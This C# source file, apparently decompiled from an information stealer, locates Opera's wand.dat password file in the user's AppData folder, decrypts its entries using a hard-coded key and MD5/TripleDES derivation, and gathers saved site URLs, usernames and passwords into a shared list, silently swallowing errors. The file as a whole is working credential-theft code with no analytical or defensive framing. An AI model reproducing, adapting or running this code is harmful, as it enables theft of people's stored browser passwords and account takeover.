using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;

public static class GClass2
{
	private static byte[] byte_0 = new byte[11]
	{
		131, 125, 252, 15, 142, 179, 232, 105, 115, 175,
		255
	};

	private static string string_0 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	public static void smethod_0()
	{
		if (File.Exists(string_0 + "\\Opera\\Opera\\wand.dat"))
		{
			string_0 += "\\Opera\\Opera\\wand.dat";
			smethod_1();
		}
		else if (File.Exists(string_0 + "\\Opera\\Opera\\profile\\wand.dat"))
		{
			string_0 += "\\Opera\\Opera\\profile\\wand.dat";
			smethod_1();
		}
	}

	private static void smethod_1()
	{
		try
		{
			List<string> list = new List<string>();
			byte[] array = File.ReadAllBytes(string_0);
			int num = 0;
			for (int i = 0; i < array.Length - 4; i++)
			{
				if (array[i] == 0 && array[i + 1] == 0 && array[i + 2] == 0 && array[i + 3] == 8)
				{
					num = array[i + 15];
					byte[] array2 = new byte[8];
					byte[] array3 = new byte[num];
					Array.Copy(array, i + 4, array2, 0, array2.Length);
					Array.Copy(array, i + 16, array3, 0, array3.Length);
					list.Add(smethod_2(array2, array3));
					i += 11 + num;
				}
			}
			string[] array4 = list.ToArray();
			List<string> list2 = new List<string>();
			List<string> list3 = new List<string>();
			for (int j = 6; j <= array4.Length - 1; j++)
			{
				string empty = string.Empty;
				string empty2 = string.Empty;
				string empty3 = string.Empty;
				string empty4 = string.Empty;
				if (array4[j].Contains("http://") || array4[j].Contains("https://") || array4[j].Contains("ftp://"))
				{
					list3.Add(array4[j]);
				}
				if (array4[j].Contains("http://") || array4[j].Contains("https://") || array4[j].Contains("ftp://"))
				{
					list2.Add(array4[j + 2]);
				}
				if (Uri.IsWellFormedUriString(array4[j], UriKind.RelativeOrAbsolute))
				{
					empty3 = array4[j].Replace("\0", string.Empty);
					empty = list3[0].Replace("\0", string.Empty);
					empty2 = list2[1].Replace("\0", string.Empty);
					empty4 = list3[1].Replace("\0", string.Empty);
					list2.Clear();
					list3.Clear();
					Class12.list_0.Add(new GClass0("Opera", empty, empty2, empty3, empty4));
				}
			}
		}
		catch
		{
		}
	}

	private static string smethod_2(byte[] byte_1, byte[] byte_2)
	{
		try
		{
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			mD5CryptoServiceProvider.Initialize();
			byte[] array = new byte[byte_0.Length + byte_1.Length];
			Array.Copy(byte_0, array, byte_0.Length);
			Array.Copy(byte_1, 0, array, byte_0.Length, byte_1.Length);
			byte[] array2 = mD5CryptoServiceProvider.ComputeHash(array);
			array = new byte[array2.Length + byte_0.Length + byte_1.Length];
			Array.Copy(array2, array, array2.Length);
			Array.Copy(byte_0, 0, array, array2.Length, byte_0.Length);
			Array.Copy(byte_1, 0, array, array2.Length + byte_0.Length, byte_1.Length);
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(array);
			TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
			tripleDESCryptoServiceProvider.Mode = CipherMode.CBC;
			tripleDESCryptoServiceProvider.Padding = PaddingMode.ISO10126;
			byte[] array3 = new byte[24];
			byte[] array4 = new byte[8];
			Array.Copy(array2, array3, array2.Length);
			Array.Copy(sourceArray, 0, array3, array2.Length, 8);
			Array.Copy(sourceArray, 8, array4, 0, 8);
			tripleDESCryptoServiceProvider.Key = array3;
			tripleDESCryptoServiceProvider.IV = array4;
			ICryptoTransform cryptoTransform = tripleDESCryptoServiceProvider.CreateDecryptor();
			byte[] bytes = cryptoTransform.TransformFinalBlock(byte_2, 0, byte_2.Length);
			return Encoding.Unicode.GetString(bytes);
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			return string.Empty;
		}
	}
}
